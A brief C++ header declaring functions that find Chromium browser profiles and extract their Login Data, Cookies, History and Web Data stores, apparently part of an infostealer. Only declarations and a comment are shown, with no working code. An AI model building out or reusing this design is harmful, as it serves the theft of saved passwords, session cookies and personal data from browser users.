#pragma once
#include <vector>
#include <string>
namespace features {
    std::vector<std::string> get_chromium_profiles();
    //single pass per profile: Login Data, Cookies, History, Web Data all opened once each
    void extract_chromium_all(std::vector<std::string>& profiles);
}